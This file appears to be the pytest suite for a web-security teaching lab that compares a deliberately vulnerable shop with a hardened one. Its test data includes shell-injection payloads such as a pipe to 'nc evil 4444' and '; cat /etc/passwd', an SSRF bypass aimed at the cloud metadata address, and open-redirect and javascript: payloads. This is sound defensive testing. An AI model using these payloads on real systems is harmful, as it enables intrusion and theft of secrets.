import re
from urllib.parse import quote, urlencode

import pytest

from aisec_lab import load_lab_module

shop = load_lab_module(__file__, "shop")
attacks = load_lab_module(__file__, "attacks")


@pytest.mark.parametrize("name,fn", attacks.ALL, ids=[n for n, _ in attacks.ALL])
def test_every_attack_works_on_vulnerable_and_fails_on_secure(name, fn):
    assert fn(shop.VulnerableShop())[0], f"{name} should succeed on the vulnerable shop"
    assert not fn(shop.SecureShop())[0], f"{name} should be blocked on the secure shop"


def test_parameterized_search_still_finds_normal_products():
    status, _, body = shop.SecureShop().handle("GET", "/search?q=mug")
    assert status == 200 and "Blue mug" in body and "Red mug" in body


def test_xss_payload_is_html_encoded_not_dropped():
    _, _, body = shop.SecureShop().handle("GET", "/search?q=" + quote("<b>hi</b>"))
    assert "&lt;b&gt;hi&lt;/b&gt;" in body


def test_csrf_secure_rejects_missing_token_even_without_origin_header():
    app = shop.SecureShop()
    c = shop.login_cookie(app, "alice", "alice-lab-pw")
    status, _, _ = app.handle("POST", "/account/email", {"Cookie": c}, urlencode({"email": "x@evil.example"}))
    assert status == 403


def test_csrf_secure_accepts_the_real_form_with_its_token():
    app = shop.SecureShop()
    c = shop.login_cookie(app, "alice", "alice-lab-pw")
    _, _, page = app.handle("GET", "/account", {"Cookie": c})
    token = re.search(r"name=csrf_token value='([^']+)'", page).group(1)
    status, _, _ = app.handle("POST", "/account/email", {"Cookie": c, "Origin": "https://shop.example"},
                              urlencode({"email": "alice@new.example", "csrf_token": token}))
    assert status == 200


def test_secure_session_cookie_has_httponly_secure_samesite():
    _, h, _ = shop.SecureShop().handle("POST", "/login", body="username=alice&password=alice-lab-pw")
    assert all(flag in h["Set-Cookie"] for flag in ("HttpOnly", "Secure", "SameSite=Lax"))


def test_naive_prefix_check_is_bypassed_but_parsed_allowlist_is_not():
    tricky = "https://stock.partner.example@169.254.169.254/latest/meta-data/"
    assert shop.naive_prefix_check(tricky) is True  # the wrong fix lets it through
    assert shop.ssrf_allowed(tricky) is False
    assert shop.ssrf_allowed("https://stock.partner.example/api/stock?sku=101") is True
    assert shop.ssrf_allowed("http://stock.partner.example/") is False  # https only
    assert shop.ssrf_allowed("https://stock.partner.example:8443/") is False


def test_secure_ssrf_never_reaches_the_fake_network_for_blocked_urls():
    app = shop.SecureShop()
    app.handle("GET", "/stock?url=" + quote("http://localhost/admin"))
    assert app.fetch_log == []


@pytest.mark.parametrize("payload", ["8.8.8.8 && id", "x|nc evil 4444", "$(whoami)", "`id`", "a\nid"])
def test_shell_metacharacters_become_extra_commands_in_the_fake_shell(payload):
    sh = shop.FakeShell()
    sh.run(f"ping -c 1 {payload}")
    assert len(sh.executed) >= 2


def test_argv_mode_keeps_hostile_input_as_one_argument():
    ex = shop.FakeExec()
    ex.run_argv(["ping", "-c", "1", "127.0.0.1; cat /etc/passwd"])
    assert ex.executed == [["ping", "-c", "1", "127.0.0.1; cat /etc/passwd"]]


def test_secure_ping_accepts_a_normal_hostname():
    status, _, body = shop.SecureShop().handle("GET", "/tools/ping?host=stock.partner.example")
    assert status == 200 and "argv mode" in body


def test_owner_can_still_read_own_order_on_secure_shop():
    app = shop.SecureShop()
    c = shop.login_cookie(app, "alice", "alice-lab-pw")
    status, _, body = app.handle("GET", "/orders/1", {"Cookie": c})
    assert status == 200 and "Pune" in body


@pytest.mark.parametrize("nxt", ["https://evil.example", "//evil.example", "/\\evil.example",
                                 "https:evil.example", "javascript:alert(1)"])
def test_open_redirect_variants_fall_back_to_home(nxt):
    assert shop.safe_next(nxt) == "/"


def test_local_redirect_is_kept():
    assert shop.safe_next("/orders/1?tab=items") == "/orders/1?tab=items"


def test_misconfig_scan_finds_issues_on_vulnerable_and_none_on_secure():
    found = shop.misconfig_scan(shop.VulnerableShop())
    for f in ("DEBUG_ENDPOINT_ENABLED", "DIRECTORY_LISTING", "DEFAULT_CREDENTIALS", "VERBOSE_ERRORS",
              "SERVER_VERSION_BANNER", "MISSING_HEADER:Content-Security-Policy"):
        assert f in found
    assert shop.misconfig_scan(shop.SecureShop()) == []


def test_secure_error_page_hides_the_stack_trace():
    app = shop.SecureShop()
    app.order = lambda oid, headers: 1 / 0  # force an unexpected error
    status, _, body = app.handle("GET", "/orders/1")
    assert status == 500 and "Traceback" not in body and "Reference" in body
